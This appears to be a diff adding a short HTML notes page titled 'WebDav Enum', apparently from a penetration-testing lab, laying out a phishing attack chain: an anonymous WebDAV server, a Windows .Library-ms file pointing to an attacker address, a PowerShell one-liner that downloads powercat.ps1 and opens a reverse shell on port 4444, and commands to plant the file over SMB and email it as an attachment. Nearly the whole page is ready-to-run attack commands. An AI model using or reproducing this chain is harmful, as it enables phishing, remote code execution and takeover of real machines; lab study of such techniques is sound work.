@@ -1,0 +1,21 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>WebDav Enum</title>
+</head><body>pip3 install wsgidav<br/>
+<br/>
+mkdir /home/kali/webdav<br/>
+<br/>
+touch /home/kali/webdav/test.txt<br/>
+<br/>
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/<br/>
+<br/>
+<br/>
+&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt; &lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt; &lt;version&gt;6&lt;/version&gt; &lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt; &lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt; &lt;templateInfo&gt; &lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt; &lt;/templateInfo&gt; &lt;searchConnectorDescriptionList&gt; &lt;searchConnectorDescription&gt; &lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt; &lt;isSupported&gt;false&lt;/isSupported&gt; &lt;simpleLocation&gt; &lt;url&gt;http://192.168.45.215&lt;/url&gt; &lt;/simpleLocation&gt; &lt;/searchConnectorDescription&gt; &lt;/searchConnectorDescriptionList&gt; &lt;/libraryDescription&gt; &nbsp; &nbsp;<br/>
+<br/>
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.215:8000/powercat.ps1'); powercat -c 192.168.45.215 &nbsp;-p 4444 -e powershell" &nbsp; <br/>
+<br/>
+smbclient //192.168.50.195/share -c 'put config.Library-ms'<br/>
+<br/>
+sendEmail -t dave.wizard@supermagicorg.com -f test@supermagicorg.com -u "Subject" -a config.Library-ms -s 192.168.231.199 -m "Message" -xu test@supermagicorg.com -xp "test"</body></html>
